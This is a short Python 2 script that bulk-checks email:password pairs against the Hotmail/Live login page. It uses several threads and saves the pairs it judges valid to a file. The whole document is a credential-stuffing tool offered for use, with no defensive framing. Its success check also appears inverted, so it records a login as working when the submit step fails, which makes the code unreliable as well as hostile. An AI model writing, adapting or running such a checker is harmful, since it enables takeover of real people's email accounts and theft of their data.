import mechanize
import threading

def chunkIt(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0
    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
    return out

def hotmailconnects(emaillist,filex):
    for a in emaillist:
        if a.endswith('\n'):
            a = a[:-1]
        email,passwd=a.split(":",1)
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        cond1 = False
        while not cond1:
            try:
                br.open('http://login.live.com/?id=1')
                cond1=True
            except:
                pass

        br.select_form(nr=0)
        br.form['passwd'] = passwd
        br.form['login']= email
        try:
            br.submit()
            print "Could not login with " + email
        except:
            open(filex, 'a').write(email+":"+passwd+"\n")
            print "connected with "+email

def menu():
    emaillist=open(raw_input("Location of the Email with password\n=> ")).readlines()
    filex= raw_input("Location where you wan to save the working accounts\n=> ")
    nbthreads=input("Number of thread working at the same time\n=> ")
    if len(emaillist) >= nbthreads:
        z = chunkIt(emaillist, nbthreads)
        for passz in z:
            threading.Thread(target=hotmailconnects, args=(passz,filex)).start()
    else:
        z = chunkIt(emaillist, len(emaillist))
        for passz in z:
            threading.Thread(target=hotmailconnects, args=(passz,filex)).start()

menu()
